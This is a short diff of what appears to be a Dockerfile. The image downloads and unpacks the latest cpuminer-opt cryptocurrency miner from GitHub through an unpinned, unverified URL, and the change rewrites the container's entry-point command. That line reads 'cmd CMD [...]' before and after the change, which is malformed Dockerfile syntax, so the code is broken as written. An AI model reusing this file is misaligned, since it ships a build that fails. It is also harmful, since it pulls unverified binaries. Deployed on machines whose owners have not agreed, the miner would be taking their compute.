@@ -7,4 +7,4 @@ RUN apt-get -qqy update -y \
     && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
     && tar xf cpuminer-opt-linux.tar.gz
 COPY scripts/* /
-cmd CMD ["/opt/bin/entry_point.sh"]
+cmd CMD ["entry_point.sh"]
